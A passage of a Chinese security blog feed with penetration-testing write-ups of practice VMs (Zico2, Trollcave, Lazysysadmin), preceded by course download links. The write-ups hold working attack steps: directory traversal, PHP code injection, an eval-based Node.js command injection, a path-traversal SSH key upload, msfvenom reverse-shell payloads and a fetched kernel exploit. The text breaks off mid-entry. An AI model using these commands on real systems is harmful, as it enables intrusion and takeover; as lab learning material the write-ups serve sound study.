rel="noopener">https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg</a> 提取码: i622<br><strong>2020版全国计算机一级WPS Office全套考试教程</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1dK411A7fu" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1dK411A7fu</a><br>网盘链接：<a href="https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q</a> 提取码: 6ngp</p><h3 id="其他资源："><a href="#其他资源：" class="headerlink" title="其他资源："></a><strong>其他资源：</strong></h3><p><strong>最新千锋PMP项目管理视频 ：</strong><a href="https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg" target="_blank" rel="noopener">https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg</a> 提取码: m47c<br><strong>【源码】千锋教程书籍系列 ：</strong><a href="https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA" target="_blank" rel="noopener">https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZicoShop</title>
      <link href="/2021/01/09/zicoshop/"/>
      <url>/2021/01/09/zicoshop/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=188204&auto=1&height=66"></iframe><p>简介：</p><p>是一个电子商务建站技术网站Zico-Shop</p><p>主要功能：</p><p>建站技术</p><p>网店案例</p><h2 id="发现服务："><a href="#发现服务：" class="headerlink" title="发现服务："></a>发现服务：</h2><p>补充：</p><p>-sV:V扫描到的服务的端口号，apache 2.4</p><p>-sT:TCP -sS:SYN  -A：显示详细的信息</p><p>得到目标主机开放端口和操作系统</p><pre><code>nmap -sP 192.168.204.0/24nmap -sS -Pn -n -A -O -T4 192.168.204.141</code></pre><p>发现端口：</p><p>22ssh</p><p>80HTTP</p><p>111rpcbind 2-4（不知道是什么的端口）</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>常识：</p><p>/etc/password存储linux系统所有的用户信息</p><p>linux网站文件的默认目录：/var/www</p><p>在URL内通过目录穿越../../../etc/passwd来尝试访问</p><p>发现：</p><p>The requested URL /etc/password was not found on this server.</p><p>那么该网站的二级目录再次进行查找</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51024_1.png" alt></p><p>点开以后的URL变为：</p><p><a href="http://192.168.204.141/view.php?page=tools.html" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=tools.html</a></p><p>修改参数：</p><p><a href="http://192.168.204.141/view.php?page=../../etc/passwd" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../etc/passwd</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51058_2.png" alt></p><h2 id="目录发现："><a href="#目录发现：" class="headerlink" title="目录发现："></a>目录发现：</h2><pre><code>dirb http://192.168.204.141/ ←注意空格/usr/share/dirb/wordlists/common.txt</code></pre><p>发现以下目录：</p><pre><code>---- Scanning URL: http://192.168.204.141/ ----+ http://192.168.204.141/cgi-bin/ (CODE:403|SIZE:291)                           ==&gt; DIRECTORY: http://192.168.204.141/css/                                      ==&gt; DIRECTORY: http://192.168.204.141/dbadmin/                                  ==&gt; DIRECTORY: http://192.168.204.141/img/                                      + http://192.168.204.141/index (CODE:200|SIZE:7970)                             + http://192.168.204.141/index.html (CODE:200|SIZE:7970)                        ==&gt; DIRECTORY: http://192.168.204.141/js/                                       + http://192.168.204.141/LICENSE (CODE:200|SIZE:1094)                           + http://192.168.204.141/package (CODE:200|SIZE:789)                            + http://192.168.204.141/server-status (CODE:403|SIZE:296)                      + http://192.168.204.141/tools (CODE:200|SIZE:8355)                             ==&gt; DIRECTORY: http://192.168.204.141/vendor/                                   + http://192.168.204.141/view (CODE:200|SIZE:0)     </code></pre><p>访问dbadmin</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51127_3.png" alt></p><p>点击进入test_db.php</p><p>试试弱口令：admin登陆成功</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51130_4.png" alt></p><p>这个地方给人的感觉就像是可以管理数据库一样所以说应该可以上传一个东西到数据库什么的，而且就这个页面而言，创建一个新的数据库是没有问题的</p><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="1-创建新的数据库和表格"><a href="#1-创建新的数据库和表格" class="headerlink" title="1.创建新的数据库和表格"></a>1.创建新的数据库和表格</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51142_6.png" alt></p><p>选择数据库：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51149_8.png" alt></p><p>创建表格：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51150_9.png" alt></p><h3 id="2-表格里储存可执行的php代码"><a href="#2-表格里储存可执行的php代码" class="headerlink" title="2.表格里储存可执行的php代码"></a>2.表格里储存可执行的php代码</h3><?php system(ls);?><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51159_10.png" alt></p><h3 id="3-php代码里执行远程主机命令"><a href="#3-php代码里执行远程主机命令" class="headerlink" title="3.php代码里执行远程主机命令"></a>3.php代码里执行远程主机命令</h3><p>通过之前的文件包含漏洞来执行</p><p><a href="http://192.168.204.141/view.php?page=../../usr/databases/bing.php" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../usr/databases/bing.php</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51202_11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trollcave渗透测试</title>
      <link href="/2020/12/28/trollcave/"/>
      <url>/2020/12/28/trollcave/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>简介：一个社区论坛网站</p><p><em>“God himself cannot hack this website.” – dragon, site admin</em></p><p>很牛逼的介绍啊！！</p><h1 id="Trollcave渗透测试案例："><a href="#Trollcave渗透测试案例：" class="headerlink" title="Trollcave渗透测试案例："></a>Trollcave渗透测试案例：</h1><h2 id="1-了解其功能"><a href="#1-了解其功能" class="headerlink" title="1.了解其功能"></a>1.了解其功能</h2><p>主要功能：欢迎导语页面，密码重置，法律宗教</p><h2 id="2-发现服务（nmap）"><a href="#2-发现服务（nmap）" class="headerlink" title="2.发现服务（nmap）"></a>2.发现服务（nmap）</h2><h3 id="1-发现主机IP"><a href="#1-发现主机IP" class="headerlink" title="1.发现主机IP"></a>1.发现主机IP</h3><pre><code>nmap -sP</code></pre><h3 id="2-发现端口（服务）"><a href="#2-发现端口（服务）" class="headerlink" title="2.发现端口（服务）"></a>2.发现端口（服务）</h3><pre><code>nmap -sS -O（显示操作系统信息） -P0（无Ping扫描） -n（不进行dns解析） -Anmap -sS -O -P0 -n -A</code></pre><p>关于-P0：</p><p>无ping扫描可以躲避某些防火墙的防护，可以在目标主机禁止ping的情况下使用。</p><p>用-P0禁止主机发现会使Nmap对每一个指令的目标IP地址进行所要求的扫描，可以穿透防火墙，也可以避免被防火墙发现。</p><p>得到端口：</p><p>20：ssh</p><p>80：HTTP</p><h2 id="3-逻辑缺陷分析"><a href="#3-逻辑缺陷分析" class="headerlink" title="3.逻辑缺陷分析"></a>3.逻辑缺陷分析</h2><h3 id="1-分析网站的功能"><a href="#1-分析网站的功能" class="headerlink" title="1.分析网站的功能"></a>1.分析网站的功能</h3><p>1.注册不可用</p><p>2.网站用户的权限：</p><p>King：superadmin</p><p>coderguy：admin</p><p>3.修改（重置）密码的路径暴露了：</p><p>password_resets</p><pre><code>所以我最近收到了很多用户的电子邮件，他们忘记了密码，需要重新设置。因为这个网站没有“忘记密码”按钮，我不得不手动重置。我真的厌倦了，所以是时候实施密码重置了。目前正忙于此事，但网站电子邮件有问题。您可能已经注意到，由于这个原因，新用户的激活已被关闭。到目前为止，我已经在rails中实现了一个password_resets资源（implemented a password_resets resource in rails），除了电子邮件之外，它的工作效率大约是90%。非常令人沮丧。如果有人对如何让电子邮件正常工作有任何建议，请给我发一封</code></pre><p>这里也就是说已经通过发送邮件的方式来进行修改密码</p><p>而且是基于rail来实现的</p><h3 id="2-从功能上分析逻辑漏洞"><a href="#2-从功能上分析逻辑漏洞" class="headerlink" title="2.从功能上分析逻辑漏洞"></a>2.从功能上分析逻辑漏洞</h3><p>1.重置密码漏洞：</p><p>①漏洞发现，发现重置密码的路径</p><p>②漏洞利用，修改超级管理员的密码</p><h2 id="4-利用漏洞"><a href="#4-利用漏洞" class="headerlink" title="4.利用漏洞"></a>4.利用漏洞</h2><p>1.经过对implemented a password_resets resource in rails资料查阅(这里有两个关键词password_resets和rails，google一下，发现这么一个网站<a href="https://www.railstutorial.org/book/password_reset)：" target="_blank" rel="noopener">https://www.railstutorial.org/book/password_reset)：</a></p><p>/password_resets/new可以对member成员的密码进行修改但是对King无法进行修改</p><p><a href="http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=xer" target="_blank" rel="noopener">http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=xer</a></p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//搜狗截图20年12月28日1441_1.png" style="zoom:80%;"><p>2.但是这里存在一个垂直越权的漏洞：</p><p><a href="http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=King" target="_blank" rel="noopener">http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=King</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51446_3.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51445_2.png" alt></p><p>说明已经将King的密码成功修改了</p><p>然后登陆：success！！！</p><p>3.接下来开始利用superadmin来对该网页进行学习（嘿嘿嘿）</p><p>①创建ssh公钥：</p><p>a.在攻击机利用ssh命令创建一个public key，来连接靶机上你先要连接的用户</p><p>通过信息收集：</p><p><u>嘿，伙计，如果我要在网站上做更多的工作，我真的需要sudo访问。我也不知道对我来说交互使用rails用户是一个多好的主意，也许我们应该分开，我梦寐以求的coderguy in /etc/sudoers…</u></p><p>得到用户：<strong>rails</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51557_4.png" alt></p><p>然后收集到一个路径：/home/rails/.ssh/<u>authorized_keys</u>这个地方是文件名可以自行修改</p><p>b.接下来在kali上为其创建公钥</p><pre><code>ssh-keygen -C（为所创建的公钥做注释）rails@192.168.204.140</code></pre><p>②把public key上 传到靶机上：</p><p>a.利用文件上传</p><p>b.按公钥存储的路径（默认Default）上传公钥</p><p><strong>../../../../../../home/rails/.ssh/authorized_keys</strong>（上传的名字）注意这里的名字一定要是authorized_keys</p><p>③在攻击机利用公钥去连接靶机上的用户</p><pre><code>ssh rails@192.168.204.140 -i xxx（此处的名字要与你上传的xxx.pub文件名字相同，不然会连接不上！！！！）Last login: Thu Jul 11 03:57:36 2019 from 192.168.198.136$ ifconfig  inet addr:192.168.204.140$ whoamirails$ ls /homecoderguy  dave    dragon    king  rails          </code></pre><h3 id="5-关键文件代码分析"><a href="#5-关键文件代码分析" class="headerlink" title="5.关键文件代码分析"></a>5.关键文件代码分析</h3><pre><code>$vim /home/king/calc/calc.jshttp.createServer(onRequest).listen(8888, &#39;127.0.0.1&#39;)//说明在靶机上创建了一个服务8端口8888分析route（路由）函数：##解释：根据url里面不同的地址，分别调用与之对应的函数来响应function calc(pathname, request, query, response){        sum = query.split(&#39;=&#39;)[1];        #将等号后面的值赋给sum        console.log(sum)        #其实这个方法和alert方法类似，唯一不同的是该方法是显示在控制台的，而alert()方法是显示在浏览器上的        response.writeHead(200, {&quot;Content-Type&quot;: &quot;text/plain&quot;});#向请求的客户端发送响应头。 该函数在一个请求内最多只能调用一次，如果不调用，则会自动生成一个响应头。statusCode HTTP状态码，如200(请求成功），404（未找到）等。        response.end(eval(sum).toString());        #停止处理文件的脚本代码，并且返回当前产生的内容}</code></pre><p> response.end(eval(sum).toString());</p><p>eval()执行response对象end（计算公式），之后把计算公式的结果返回到浏览器</p><p>eg：<a href="http://192.168.204.140/?sum=1+1然后通过end来把结果2反馈给浏览器" target="_blank" rel="noopener">http://192.168.204.140/?sum=1+1然后通过end来把结果2反馈给浏览器</a></p><p>eg：<a href="http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)" target="_blank" rel="noopener">http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)</a></p><p>这里会通过require（）在本地操作系统上启动一个子进程，然后通过上述子进程去执行（exec）whoami这个shell命令，然后将上述内容房子eval（）里面，结果就会在本地操作系统上真正执行whoami</p><p>踩坑：如果calc.js文件因为操作失误不小心把内容干没了，就重置虚拟机</p><h3 id="6-代码漏洞验证"><a href="#6-代码漏洞验证" class="headerlink" title="6.代码漏洞验证"></a>6.代码漏洞验证</h3><p>接下来使用虚拟机来模拟上述的在URL里面执行的操作</p><p>1.验证8888端口服务是不是启动</p><pre><code>netstat -antp列出当前主机上所有开放的端口|grep 8888只看端口8888是否启动netstat -antp | grep 8888</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51925_5.png" alt></p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=1+1&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51937_6.png" alt></p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;whoani&#39;)&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51941_7.png" alt></p><p>如果命令执行且没有报错，说明可能存在shell上传漏洞，也就是说，有可以利用的反弹shell</p><h3 id="7-生成并上传shell"><a href="#7-生成并上传shell" class="headerlink" title="7.生成并上传shell"></a>7.生成并上传shell</h3><p>这里不会得到命令的输出，而是返回了[object Object]，由此猜测sum参数里的whoami这个命令被执行了，因此可以利用这里触发一个shell。</p><p><strong>1.使用msfvenom创建shell：</strong></p><p>msfvenom -p linux/x64/meterpreter_reverse_tcp  → 设置payload</p><p>-f elf  →  生成格式</p><p>-o shell → 生成路径（输出文件名字）</p><p>LHOST=192.168.110.6   →    Kali地址</p><p>LPORT=6666      →    反弹端口</p><p>先启动msfconsole,之后输入如下命令：</p><pre><code>msf &gt; msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o demo -a x64 --platform linux LHOST=192.168.204.138 LPORT=6666</code></pre><p>2.利用文件漏洞上传shell</p><p>路径：/tmp/demo</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A52034_8.png" alt></p><p>可以看出上传文件成功</p><p>3.反弹shell</p><pre><code>msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload linux/x64/meterpreter_reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.110.6msf exploit(handler) &gt; set LPORT 6666msf exploit(handler) &gt; run -j</code></pre><pre><code>cd /tmp./yshell</code></pre><p>发现因为权限问题yshell无法反弹</p><p>4.编写启动shell的脚本(在tmp目录下)</p><p>因为rails用户没有上传执行shell的权限</p><pre><code>vim run.sh#!/bin/bashsudo cp /tmp/shell1 /home/king/shell1sudo chown king:king /home/king/shell1(chown： 修改所属用户与组。将shell1拥有者与群组改为king)sudo chmod a+x /home/king/shell1sudo /home/king/shell1</code></pre><p>对chmod命令的回顾：</p><p>符号类型改变文件权限方式：</p><p>还有一个改变权限的方法，从之前的介绍中我们可以发现，基本上就九个权限分别是：</p><ul><li>user：用户</li><li>group：组</li><li>others：其他</li></ul><p>那么我们就可以使用 <strong>u, g, o</strong> 来代表三种身份的权限。</p><p>此外， <strong>a</strong> 则代表 <strong>all</strong>，即全部的身份。读写的权限可以写成 <strong>r, w, x</strong>，也就是可以使用下表的方式来看：</p><table><thead><tr><th align="center">chmod</th><th>u g o a</th><th>+(加入) -(除去) =(设定)</th><th>r w x</th><th>文件或目录</th></tr></thead><tbody><tr><td align="center"></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>如果我们需要将文件权限设置为 <strong>-rwxr-xr–</strong> ，可以使用 <strong>chmod u=rwx,g=rx,o=r 文件名</strong> 来设定:</p><pre><code>#  touch test1    // 创建 test1 文件# ls -al test1    // 查看 test1 默认权限-rw-r--r-- 1 root root 0 Nov 15 10:32 test1# chmod u=rwx,g=rx,o=r  test1    // 修改 test1 权限# ls -al test1-rwxr-xr-- 1 root root 0 Nov 15 10:32 test1</code></pre><p>而如果是要将权限去掉而不改变其他已存在的权限呢？例如要拿掉全部人的可执行权限，则：</p><pre><code>#  chmod  a-x test1# ls -al test1-rw-r--r-- 1 root root 0 Nov 15 10:32 test1</code></pre><p>5.运行脚本</p><pre><code>./run.sh</code></pre><p>但是因为权限不够，脚本无法运行</p><p>因为/home/king目录下的calc</p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;/tmp/run.sh&#39;)&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8829%E6%97%A51902_1.png" alt></p><p>然后没有反弹shell</p><p>查看了一下king目录下，并没有yshell，也就是说脚本没有运行</p><pre><code>chmod a+x run.js#赋予可执行权限</code></pre><p>然后再curl成功反弹shell</p><p>python -c ‘import pty; pty.spawn(“/bin/bash”)’</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8802%E6%97%A50052_1.png" alt></p><h2 id="另一种方法（针对ubantu的版本漏洞进行提权）："><a href="#另一种方法（针对ubantu的版本漏洞进行提权）：" class="headerlink" title="另一种方法（针对ubantu的版本漏洞进行提权）："></a>另一种方法（针对ubantu的版本漏洞进行提权）：</h2><h3 id="1-ssh创建好shell"><a href="#1-ssh创建好shell" class="headerlink" title="1.ssh创建好shell"></a>1.ssh创建好shell</h3><p>uname -a得：<br>Linux trollcave 4.4.0-197-generic #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><p><strong>cat /proc/versio</strong>n得：</p><p>Linux version 4.4.0-197-generic (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020</p><p>2.得知ubantu和linux版本信息</p><p>懂<del>~</del></p><pre><code>searchsploit 4.4.0-197</code></pre><p> Exploits: No Result<br>Shellcodes: No Result</p><p>是在下不配了</p><p>百度<a href="https://www.cnblogs.com/hookjoy/p/8616250.html" target="_blank" rel="noopener">Ubuntu16.04 本地提权漏洞复测过程</a></p><pre><code>rails@trollcave:/proc/sys/kernel$ cat unprivileged_bpf_disabled 0</code></pre><p><em><em>1，下载poc文件 upstream44.c<br>下载地址：<a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/up … mp;isappinstalled=0</a></em></em></p><p>下载物理机上传kali上面就行</p><pre><code>root@kali1:~/桌面/trollcave# gcc -o upstream upstream44.c</code></pre><p>复制，利用网站的文件上传漏洞传到/tmp/.Test-unix/666并赋予可执行命令，结果出问题了</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lazysysadmin渗透初探</title>
      <link href="/2020/12/26/idontcare/"/>
      <url>/2020/12/26/idontcare/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简单介绍：一个简单的社区宣传网站"><a href="#简单介绍：一个简单的社区宣传网站" class="headerlink" title="简单介绍：一个简单的社区宣传网站"></a>简单介绍：一个简单的社区宣传网站</h1><h2 id="IDontCare渗透测试："><a href="#IDontCare渗透测试：" class="headerlink" title="IDontCare渗透测试："></a>IDontCare渗透测试：</h2><h3 id="1-主机发现："><a href="#1-主机发现：" class="headerlink" title="1.主机发现："></a>1.主机发现：</h3><h4 id="发现主机的ip地址："><a href="#发现主机的ip地址：" class="headerlink" title="发现主机的ip地址："></a>发现主机的ip地址：</h4><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>-sP被发现主机所有在的网段（通过ping命令）</p><pre><code>nmap -sP 127.0.0.0/24</code></pre><p>根据mac地址00:0C:29:E3:72:75找到ip地址</p><p>192.168.204.13913</p><h3 id="2-服务发现："><a href="#2-服务发现：" class="headerlink" title="2.服务发现："></a>2.服务发现：</h3><h4 id="发现主机上的开放的端口："><a href="#发现主机上的开放的端口：" class="headerlink" title="发现主机上的开放的端口："></a>发现主机上的开放的端口：</h4><pre><code>nmap -sS（半开放式扫描，加快速度） -O(操作系统的信息) -p 1-65536 -T4但是这里我使用：nmap -sS -Pn -n -A 192.168.204.139</code></pre><p>发现端口：</p><p>22（ssh） </p><p>80（http）</p><p>3306（mysql）</p><p>139</p><p>445</p><p>6667</p><p>然后针对得到的端口进行实体化浏览</p><h3 id="3-关键目录扫描："><a href="#3-关键目录扫描：" class="headerlink" title="3.关键目录扫描："></a>3.关键目录扫描：</h3><p>1.根据dirb来对该网站进行扫描来确定他下面有哪一些子目录</p><pre><code>dirb http://192.168.204.139</code></pre><p>发现：</p><p><a href="http://192.168.204.139/phpmyadmin/" target="_blank" rel="noopener">http://192.168.204.139/phpmyadmin/</a></p><p>并没有发现东西，只是一个登陆界面</p><p><a href="http://192.168.204.139/wordpress/" target="_blank" rel="noopener">http://192.168.204.139/wordpress/</a></p><p>发现了一个名字：togie</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52215_1.png" alt></p><h3 id="4-查看是否有共享目录"><a href="#4-查看是否有共享目录" class="headerlink" title="4.查看是否有共享目录"></a>4.查看是否有共享目录</h3><p>1.通过enum4linux来枚举靶机的共享目录</p><pre><code>enum4linux 192.168.204.139</code></pre><p>会发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52244_2.png" alt></p><p>share$目录</p><p>并且发现允许使用空参进行登录</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52302_3.png" alt></p><p>3.通过mount命令请求一下共享资源（挂载）</p><pre><code>mount -t cifs -o username=&#39; &#39;,password=&#39;&#39; //192.168.204.139/share$ /mnt这里-t是以什么文件常见文件类型：mtfs（fat，ext）（非网络，基于本地，磁盘等）而cifs（common internet file system）//挂载互联网上的文件（基于网络）-o （选项）想要访问一个共享目录，就要指定该访问用户uname和upasswd以及所在网络的IP，而share$是指访问这个目录/mnt将share$的目录挂载到攻击机的该目录下</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52330_4.png" alt></p><p>挂载成功</p><p>解释：</p><p>CIFS (Common Internet FileSystem) 通用Internet文件系统。使用客户/服务器模式，CIFS是公共的或开放的SMB协议版本，CIFS面向网络连接的共享协议，对网络传输的可靠性要求高，常使用TCP/IP。</p><pre><code>mount [options] &lt;source&gt; &lt;directory&gt;</code></pre><p><strong>-t</strong> vfstype 指定文件系统的类型（通常不必指定。mount 会自动选择正确的类型。）</p><p>常用类型有：<br>光盘或光盘镜像：<strong>iso9660</strong><br>DOS fat16文件系统：<strong>msdos</strong><br>Windows 9x fat32文件系统：<strong>vfat</strong><br>Windows NT ntfs文件系统：<strong>ntfs</strong><br>Mount Windows文件网络共享：<strong>smbfs</strong><br>UNIX(LINUX) 文件网络共享：<strong>nfs</strong></p><p><strong>-o</strong> options 主要用来描述设备或档案的挂接方式。常用的参数有：<br><strong>loop</strong>：用来把一个文件当成硬盘分区挂接上系统<br><strong>ro</strong>：采用只读方式挂接设备<br><strong>rw</strong>：采用读写方式挂接设备<br><strong>iocharset</strong>：指定访问文件系统所用字符集<br><strong>device</strong> 要挂接(mount)的设备。<br><strong>dir</strong>设备在系统上的挂接点(mount point)。</p><h3 id="5-文件分析-ssh登录"><a href="#5-文件分析-ssh登录" class="headerlink" title="5.文件分析-ssh登录"></a>5.文件分析-ssh登录</h3><p>这里查找deetstxt文件发现：</p><p><img 